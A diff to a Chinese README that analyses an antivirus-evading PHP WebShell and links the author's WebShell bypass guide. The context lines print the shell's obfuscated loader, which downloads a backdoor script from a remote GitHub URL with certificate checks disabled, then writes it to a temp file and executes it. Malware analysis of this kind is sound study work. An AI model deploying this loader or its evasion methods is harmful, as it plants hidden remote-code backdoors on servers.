@@ -6,6 +6,8 @@
 
 刚好最近闲的没事干，也在研究WebShell方面的免杀，就随手看看
 
+**如果你对其他WebShell免杀和相关ByPass技术感兴趣，欢迎来到我的另外一个项目：[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)**
+
 我将在本项目，讲解这个免杀WebShell大马的核心运作原理，觉得不错可以给我点个Star😆
 
 ## 2# 杀软测试
@@ -118,6 +120,8 @@ Tc(gW("ISEhISELMCshISFgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgY
 <?php
 /* __________________________________________________ | Obfuscated by YAK Pro - Php Obfuscator 2.0.14 | | on 2023-12-03 17:56:35 | | GitHub: https://github.com/pk-fr/yakpro-po | |__________________________________________________| */ goto Fw; A6: function tv($rR) { goto D7; iC: $ZC = (include $y5); goto pi; Nj: return $ZC; goto iR; DF: file_put_contents($y5, "{$rR}"); goto iC; D7: $y5 = tempnam(sys_get_temp_dir(), "\x74\x6d\x70\x5f\146\165\x6e\x63"); goto DF; pi: unlink($y5); goto Nj; iR: } goto u0; Fw: $hS = curl_init(); goto Sq; sw: $rL = curl_exec($hS); goto OZ; OZ: curl_close($hS); goto A6; Sq: curl_setopt_array($hS, array(CURLOPT_URL => "\150\164\x74\160\163\x3a\x2f\x2f\162\x61\x77\56\x67\x69\164\x68\165\x62\x75\163\x65\162\x63\157\156\x74\x65\156\x74\56\x63\x6f\x6d\57\62\x32\x58\x70\154\x6f\151\164\x65\162\103\162\145\167\55\x54\x65\x61\155\x2f\107\x65\154\64\171\55\x4d\x69\x6e\151\x2d\123\150\x65\x6c\x6c\x2d\102\141\143\x6b\144\x6f\x6f\x72\x2f\x64\x65\x76\57\x67\145\x6c\x61\x79\x2e\x70\x68\160", CURLOPT_SSL_VERIFYHOST => FALSE, CURLOPT_SSL_VERIFYPEER => FALSE, CURLOPT_RETURNTRANSFER => TRUE)); goto sw; u0: tv($rL);
 ```
+
+提一嘴，这里根据注释的PHP文件头，可以发现一个开源项目：[https://github.com/pk-fr/yakpro-po](https://github.com/pk-fr/yakpro-po)，这个项目就是专门用来对PHP文件进行 `goto` 混淆的工具，感谢 [@Skyworship](https://github.com/Esonhugh) 师傅的指出
 
 同样，梳理 `goto` 的跳转内容，可以解码并整理出以下原始内容，即本仓库的 `Gel4y-Mini-Shell-2_decode.php`，内容如下：
 
